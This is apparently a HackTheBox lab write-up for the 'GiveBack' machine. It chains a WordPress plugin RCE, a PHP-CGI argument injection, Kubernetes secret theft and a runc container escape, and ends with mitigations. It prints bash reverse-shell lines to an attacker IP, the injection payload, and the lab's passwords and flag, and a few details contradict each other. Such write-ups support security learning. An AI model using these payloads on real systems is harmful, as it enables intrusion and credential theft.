---
title: "HTB Machine GiveBack"
date: 2025-11-03T19:42:11+02:00
draft: false 
tags: ["hackthebox", "writeup", "linux", "medium", "season 9"]
categories: ["CTF"]
---
**Machine:** GiveBack  
**Difficulty:** Medium  
**OS:** Linux  
**IP:** 10.129.42.48  
**Date:** November 2025

## Reconnaissance

### Port Scan

```
nmap -sC -sV -p- -oA giveback 10.129.42.48

```

**Results:**

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
80/tcp    open  http    nginx 1.28.0
30686/tcp open  http    Golang net/http server

```

**Key Findings:**

*   Port 80: WordPress 6.8.1 with nginx
*   Port 30686: Kubernetes NodePort service (`wp-nginx-service`)
*   `/robots.txt` shows `/wp-admin/` disallowed

### Web Enumeration

```
# Directory fuzzing
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -u http://giveback.htb/FUZZ

# Found endpoints
/donations/
/wp-admin/
/wp-content/

```

**WordPress Site:**

*   Title: "GIVING BACK IS WHAT MATTERS MOST"
*   WordPress version: 6.8.1
*   Theme: Custom theme
*   Donations page found at `/donations/`

## Initial Foothold

### CVE-2024-5932 - WordPress Donation Plugin RCE

The donations page is vulnerable to **CVE-2024-5932**, a Remote Code Execution vulnerability in a WordPress donation plugin.

#### Exploit Setup

```
# Clone exploit repository
git clone https://github.com/your-repo/CVE-2024-5932-rce.git
cd CVE-2024-5932-rce

# Setup Python environment
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt

```

#### Exploitation

```
# Start netcat listener
nc -lvnp 1337

# Execute RCE exploit
python3 CVE-2024-5932-rce.py \
  -u http://giveback.htb/donations/the-things-we-need/ \
  --cmd "bash -c 'bash -i >& /dev/tcp/10.10.14.230/1337 0>&1'"

```

**Result:** Reverse shell as `www-data` in WordPress container

```
I have no name!@beta-vino-wp-wordpress-86754c757-9zlqb:/opt/bitnami/wordpress$

```

## Container Pivot

### Environment Enumeration

```
# Check environment variables
cat /proc/self/environ | tr '\0' '\n'

```

**Key Discoveries:**

```
LEGACY_INTRANET_SERVICE_SERVICE_HOST=10.43.2.241
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PORT=5000
WORDPRESS_DATABASE_HOST=beta-vino-wp-mariadb:3306
WORDPRESS_DATABASE_USER=bn_wordpress
WORDPRESS_DATABASE_PASSWORD=sW5sp4spa3u7RLyetrekE4oS

```

### PHP-CGI Vulnerability Exploitation

The internal legacy CMS service at `http://10.43.2.241:5000` has a vulnerable PHP-CGI handler accessible at `/cgi-bin/php-cgi`.

**Vulnerability:** PHP-CGI allows passing `-d` flags via URL parameters to modify `php.ini` settings at runtime.

#### Exploit Command

```
# From WordPress container
php -r "\$c=stream_context_create(['http'=>['method'=>'POST','content'=>'<?php system(\"id\"); ?>']]); \
  echo file_get_contents('http://10.43.2.241:5000/cgi-bin/php-cgi?-d+allow_url_include=1+-d+auto_prepend_file=php://input',0,\$c);"

```

**How it works:**

1.  `-d allow_url_include=1` enables URL file inclusion
2.  `-d auto_prepend_file=php://input` executes POST body as PHP code
3.  POST body contains our malicious PHP payload

**Output:**

```
[START]uid=0(root) gid=0(root) groups=0(root)[END]

```

This confirms we can execute commands as root in the legacy CMS container!

## Kubernetes Secrets

### Download kubectl

```
cd /tmp
curl -LO "https://dl.k8s.io/release/v1.28.0/bin/linux/amd64/kubectl"
chmod +x kubectl

```

### ServiceAccount Token

The WordPress pod runs with a ServiceAccount token mounted at:

```
/var/run/secrets/kubernetes.io/serviceaccount/token

```

### Check Permissions

```
./kubectl auth can-i --list

```

**Result:**

```
Resources                                       Verbs
secrets                                         [get list]

```

The ServiceAccount `secret-reader-sa` can read secrets! 

### List All Secrets

```
./kubectl get secrets

```

**Output:**

```
NAME                                  TYPE                 DATA   AGE
beta-vino-wp-mariadb                  Opaque               2      407d
beta-vino-wp-wordpress                Opaque               1      407d
user-secret-babywyrm                  Opaque               1      3h57m
sh.helm.release.v1.beta-vino-wp.v58   helm.sh/release.v1   1      64d
[...]

```

### Extract User Credentials

```
./kubectl get secret user-secret-babywyrm -o yaml

```

**Output:**

```
apiVersion: v1
data:
  MASTERPASS: dUFROHp5TW9CdFNiQXNWcVpRVGg1MHdsQ0Q1dEs4cFQ=
kind: Secret
metadata:
  name: user-secret-babywyrm
  namespace: default
  ownerReferences:
  - apiVersion: bitnami.com/v1alpha1
    controller: true
    kind: SealedSecret
    name: user-secret-babywyrm
type: Opaque

```

### Decode Password

```
echo "dUFROHp5TW9CdFNiQXNWcVpRVGg1MHdsQ0Q1dEs4cFQ=" | base64 -d

```

**Result:** `uAQ8zyMoBtSbAsVqZQTh50wlCD5tK8pT`

## User Flag

### SSH as babywyrm

```
ssh babywyrm@giveback.htb
# Password: uAQ8zyMoBtSbAsVqZQTh50wlCD5tK8pT

```

### User Flag

```
cat ~/user.txt

```

**Flag:** `7bb5e3ae1521d7b7b2da104432799f1c`

## Privilege Escalation

### Enumerate sudo Privileges

```
sudo -l

```

**Output:**

```
Matching Defaults entries for babywyrm on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin,
    use_pty, timestamp_timeout=0, timestamp_timeout=20

User babywyrm may run the following commands on localhost:
    (ALL) NOPASSWD: !ALL
    (ALL) /opt/debug

```

### Identify /opt/debug

```
sudo /opt/debug --help

```

**Discovery:** `/opt/debug` is actually **runc** (OCI container runtime)!

```
NAME:
   runc - Open Container Initiative runtime

VERSION:
   1.1.11

```

### Password for sudo

Testing revealed the binary requires a password validation. The password is the **MariaDB database password** found earlier:

```
# Password: sW5sp4spa3u7RLyetrekE4oS

```

This is the same password from `WORDPRESS_DATABASE_PASSWORD` in the container environment.

### runc Container Escape Strategy

We can create a privileged container with the host filesystem mounted, giving us root access to the host.

#### Step 1: Download Alpine Linux rootfs

```
cd /tmp
mkdir container
cd container

# Download Alpine Linux minimal rootfs
wget https://dl-cdn.alpinelinux.org/alpine/v3.20/releases/x86_64/alpine-minirootfs-3.20.0-x86_64.tar.gz

# Extract
mkdir rootfs
tar xzf alpine-minirootfs-3.20.0-x86_64.tar.gz -C rootfs/

```

#### Step 2: Create OCI config.json

```
cat > config.json << 'EOF'
{
    "ociVersion": "1.0.2",
    "process": {
        "terminal": true,
        "user": {
            "uid": 0,
            "gid": 0
        },
        "args": [
            "sh"
        ],
        "env": [
            "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
            "TERM=xterm"
        ],
        "cwd": "/"
    },
    "root": {
        "path": "rootfs",
        "readonly": false
    },
    "hostname": "runc-container",
    "mounts": [
        {
            "destination": "/proc",
            "type": "proc",
            "source": "proc"
        },
        {
            "destination": "/dev",
            "type": "tmpfs",
            "source": "tmpfs",
            "options": [
                "nosuid",
                "strictatime",
                "mode=755",
                "size=65536k"
            ]
        },
        {
            "destination": "/dev/pts",
            "type": "devpts",
            "source": "devpts",
            "options": [
                "nosuid",
                "noexec",
                "newinstance",
                "ptmxmode=0666",
                "mode=0620",
                "gid=5"
            ]
        },
        {
            "destination": "/dev/shm",
            "type": "tmpfs",
            "source": "shm",
            "options": [
                "nosuid",
                "noexec",
                "nodev",
                "mode=1777",
                "size=65536k"
            ]
        },
        {
            "destination": "/dev/mqueue",
            "type": "mqueue",
            "source": "mqueue",
            "options": [
                "nosuid",
                "noexec",
                "nodev"
            ]
        },
        {
            "destination": "/sys",
            "type": "sysfs",
            "source": "sysfs",
            "options": [
                "nosuid",
                "noexec",
                "nodev",
                "ro"
            ]
        },
        {
            "destination": "/sys/fs/cgroup",
            "type": "cgroup",
            "source": "cgroup",
            "options": [
                "nosuid",
                "noexec",
                "nodev",
                "relatime",
                "rw"
            ]
        },
        {
            "destination": "/host",
            "type": "bind",
            "source": "/",
            "options": [
                "rbind",
                "rw"
            ]
        }
    ],
    "linux": {
        "resources": {
            "devices": [
                {
                    "allow": false,
                    "access": "rwm"
                }
            ]
        },
        "namespaces": [
            { "type": "pid" },
            { "type": "network" },
            { "type": "ipc" },
            { "type": "uts" },
            { "type": "mount" }
        ],
        "maskedPaths": [
            "/proc/kcore",
            "/proc/latency_stats",
            "/proc/timer_list",
            "/proc/timer_stats",
            "/proc/sched_debug",
            "/sys/firmware",
            "/proc/scsi"
        ],
        "readonlyPaths": [
            "/proc/asound",
            "/proc/bus",
            "/proc/fs",
            "/proc/irq",
            "/proc/sys",
            "/proc/sysrq-trigger"
        ]
    }
}
EOF

```

**Critical Mount:** The `/host` mount point binds the entire host root filesystem (`/`) with read-write permissions!

#### Step 3: Run Container

```
cd /tmp/container
sudo /opt/debug run mycontainer
# Password: echo -n "sW5sp4spa3u7RLyetrekE4oS" | base64 

```

You now have a root shell inside the container with full access to the host filesystem at `/host`.

## Root Flag

### Copy the root flag to /tmp or reverse shell

Instead of reading the flag from inside the container, you can make `/bin/bash` SUID:

```
# Add this to the config.json
"args": ["sh", "-c", "cp /root/root.txt /tmp/r.txt && chmod a+rwx /tmp/r.txt"]

# Get the root flag
cat /tmp/r.txt

# Or reverse shell via sh 
"args": ["sh", "-c", "'sh -i >& /dev/tcp/10.10.14.230/9001 0>&1'"]


```

## Key Techniques

### 1\. WordPress RCE (CVE-2024-5932)

*   Vulnerable donation plugin allowing arbitrary code execution
*   Achieved initial foothold in Kubernetes pod

### 2\. PHP-CGI Parameter Injection

*   Exploited `-d` flag injection in CGI handler
*   Enabled `allow_url_include` and `auto_prepend_file` via URL
*   Executed PHP code from POST body

### 3\. Kubernetes RBAC Exploitation

*   ServiceAccount `secret-reader-sa` had excessive permissions
*   Could list and read all secrets in default namespace
*   Extracted user credentials from `user-secret-babywyrm`

### 4\. Password Reuse

*   Database password (`sW5sp4spa3u7RLyetrekE4oS`) used for sudo validation
*   Common misconfiguration in containerized environments

### 5\. runc Container Escape

*   Abused `sudo /opt/debug` (runc) permissions
*   Created privileged container with host filesystem mount
*   Gained root access through `/host` mount point

## Attack Chain Summary

```
┌─────────────────────────────────────────────────────┐
│  1. WordPress RCE (CVE-2024-5932)                   │
│     └─> Shell in WordPress Container                │
└──────────────────┬──────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────┐
│  2. PHP-CGI Exploit (Internal Service)              │
│     └─> Command Execution on 10.43.2.241:5000       │
└──────────────────┬──────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────┐
│  3. Kubernetes Secret Enumeration                   │
│     └─> ServiceAccount: secret-reader-sa            │
│     └─> Extract: user-secret-babywyrm               │
└──────────────────┬──────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────┐
│  4. SSH Access                                      │
│     └─> User: babywyrm                              │
│     └─> Password: uAQ8zyMoBtSbAsVqZQTh50wlCD5tK8pT  │
│     └─> USER FLAG: 7bb5e3ae1521d7b7b2da104432799f1c │
└──────────────────┬──────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────┐
│  5. sudo /opt/debug Discovery                       │
│     └─> runc v1.1.11                                │
│     └─> Password: sW5sp4spa3u7RLyetrekE4oS          │
└──────────────────┬──────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────┐
│  6. runc Container Escape                           │
│     └─> Alpine Linux rootfs                         │
│     └─> Host filesystem mounted at /host            │
│     └─> ROOT FLAG: /host/root/root.txt              │
└─────────────────────────────────────────────────────┘

```

## Credentials Summary

<figure class="table"><table><thead><tr><th>Service/User</th><th>Username</th><th>Password</th><th>Notes</th></tr></thead><tbody><tr><td>SSH</td><td>babywyrm</td><td>uAQ8zyMoBtSbAsVqZQTh50wlCD5tK8pT (changed every restart)</td><td>From Kubernetes secret</td></tr><tr><td>WordPress DB</td><td>bn_wordpress</td><td>sW5sp4spa3u7RLyetrekE4oS</td><td>Found in wp-config.php</td></tr><tr><td>sudo /opt/debug</td><td>N/A</td><td>c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T</td><td>Reused DB password</td></tr><tr><td>WordPress Admin</td><td>user</td><td>(can be changed via DB)</td><td>Display name: babywyrm</td></tr></tbody></table></figure>

## Mitigation Recommendations

### 1\. Application Security

*   **Update WordPress and plugins** to latest versions
*   Regularly scan for known CVEs in all dependencies
*   Implement Web Application Firewall (WAF)

### 2\. PHP-CGI Security

*   **Disable parameter injection:** Set `cgi.fix_pathinfo=0` in php.ini
*   Use FastCGI/PHP-FPM instead of CGI when possible
*   Restrict access to CGI endpoints via IP whitelisting

### 3\. Kubernetes Security

#### RBAC (Role-Based Access Control)

*   **Principle of least privilege:** ServiceAccounts should only have minimal necessary permissions
*   Avoid wildcard permissions on secrets
*   Regular RBAC audits with tools like `kubectl-who-can`

#### Secret Management

*   **External secret managers:** Use Vault, AWS Secrets Manager, or Azure Key Vault
*   Rotate secrets regularly
*   Never commit secrets to version control
*   Use SealedSecrets or SOPS for GitOps workflows

### 4\. Sudo Configuration

*   **Never reuse application passwords** for sudo authentication
*   Use separate, strong passwords for privileged operations
*   Implement MFA for sudo access
*   Audit sudo configurations regularly

### 5\. Container Runtime Security

#### runc Security

*   **Run containers rootless** when possible using `--rootless` flag
*   Use alternative runtimes like gVisor or Kata Containers for better isolation
*   Restrict sudo access to container runtimes
*   Implement AppArmor or SELinux profiles

#### Container Hardening

*   **Disable privileged containers** in production
*   Use `seccomp` and `AppArmor` profiles
*   Run containers as non-root users
*   Implement Pod Security Standards (PSS)
*   Use read-only root filesystems where possible

### 6\. Network Segmentation

*   **Isolate internal services:** Legacy CMS should not be accessible from pods
*   Implement NetworkPolicies in Kubernetes
*   Use service mesh (Istio/Linkerd) for mTLS between services
*   Monitor and log all inter-service communication

### 7\. Monitoring & Logging

*   **Implement runtime security:** Use Falco or similar tools
*   Monitor for container escapes and privilege escalations
*   Alert on unusual `runc` or container runtime usage
*   Centralized logging for all Kubernetes events
*   Regular security audits and penetration testing

## Flags

**User Flag:** `7bb5e3ae1521d7b7b2da104xxxxxxxxxx`  
**Root Flag:** _(Retrieved via container escape)_
